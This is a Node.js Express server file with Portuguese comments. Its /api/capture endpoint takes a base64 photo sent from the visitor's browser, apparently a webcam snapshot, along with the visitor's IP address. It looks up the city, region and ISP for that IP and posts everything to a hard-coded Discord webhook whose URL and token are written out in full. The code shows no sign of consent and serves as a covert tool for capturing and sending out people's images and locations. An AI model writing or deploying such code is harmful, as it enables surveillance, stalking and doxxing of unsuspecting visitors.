// language: JavaScript, file: server.js
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data'); // Necessário pro Discord

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// COLOQUE A URL DO TEU WEBHOOK DO DISCORD AQUI
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1561449233327071364/HqD_RUllJp7ni_jIn7ZYhydELMiJa_Bp5VtX3NFhuBG60SvcBOyOFftwTZUdv-DpeIu_";

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/capture', async (req, res) => {
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const photoBase64 = req.body.image;
    const photoBuffer = Buffer.from(photoBase64.replace(/^data:image\/\w+;base64,/, ""), 'base64');

    let geo = { city: 'Desconhecida', region: 'Desconhecida', isp: 'Desconhecido' };
    try {
        const response = await axios.get(`http://ipwho.is/${ip}`);
        if (response.data.success) {
            geo.city = response.data.city;
            geo.region = response.data.region;
            geo.isp = response.data.connection.isp;
        }
    } catch (e) {
        console.log("Erro na API de IP");
    }

    const logData = `
**IP:** ${ip}
**Cidade:** ${geo.city} - ${geo.region}
**Provedor:** ${geo.isp}
**Hora:** ${new Date().toLocaleString('pt-BR')}
    `;
    console.log(logData);

    // Manda pro Discord
    if (DISCORD_WEBHOOK_URL.includes("SEU_ID_AQUI") === false) {
        try {
            const form = new FormData();
            form.append('payload_json', JSON.stringify({ content: logData }));
            form.append('file1', photoBuffer, 'foto.jpg');

            await axios.post(DISCORD_WEBHOOK_URL, form, {
                headers: form.getHeaders()
            });
            console.log("Enviado pro Discord com sucesso.");
        } catch (e) {
            console.log("Erro ao mandar pro Discord:", e.message);
        }
    }

    res.json({ status: 'ok' });
});

app.listen(3000, () => {
    console.log('Servidor rodando na porta 3000');
});
